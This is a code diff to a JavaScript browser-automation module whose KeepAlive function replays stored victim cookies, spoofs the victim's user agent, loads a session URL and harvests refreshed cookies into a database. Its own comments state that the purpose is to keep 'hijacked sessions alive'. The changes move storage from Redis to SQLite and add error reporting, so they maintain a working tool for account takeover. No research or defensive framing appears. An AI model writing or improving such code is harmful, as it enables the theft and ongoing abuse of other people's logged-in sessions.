@@ -2,26 +2,21 @@ const necrohelp = require('../helpers/necrohelp')
 const db = require('../../db/db')
 
 // KeepAlive loads a task's fixSession URL with its cookies and UA,
-// then harvests fresh cookies from the browser and writes them back to Redis.
+// then harvests fresh cookies from the browser and writes them back to SQLite.
 // This keeps hijacked sessions alive and ensures cookie rotation is handled.
 exports.KeepAlive = async ({ page, data: [taskId, cookies, params] }) => {
     const fixSession = params.fixSession;
     console.log(`[${taskId}] keepalive: loading ${fixSession}`);
 
     try {
-        // Set cookies from Redis (these may have been refreshed by a previous keepalive)
-        if (cookies && cookies.length > 0) {
-            const urlObj = new URL(fixSession);
-            await necrohelp.SetCookies(page, cookies, {
-                url: urlObj.origin + '/'
-            });
-        }
+        // Set cookies from SQLite (these may have been refreshed by a previous keepalive)
+        await necrohelp.SetCookieJar(page, cookies);
 
         // Configure UA to match the victim's browser fingerprint
         await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
 
-        // Navigate to fixSession URL
-        await page.goto(fixSession, { waitUntil: 'networkidle2', timeout: 30000 });
+        // Navigate to fixSession URL through the shared URL guard.
+        await necrohelp.timedGoto(page, fixSession);
         await necrohelp.Sleep(2000);
 
         // Harvest fresh cookies from the browser after page load
@@ -60,6 +55,7 @@ exports.KeepAlive = async ({ page, data: [taskId, cookies, params] }) => {
         console.log(`[${taskId}] keepalive: completed successfully`);
     } catch (e) {
         console.error(`[${taskId}] keepalive error: ${e.message}`);
-        // Don't mark the original task as error - keepalive failure is non-fatal
+        // Keepalive failure is non-fatal to original task, but scheduler must observe it.
+        return { status: 'error', error: e.message };
     }
 }
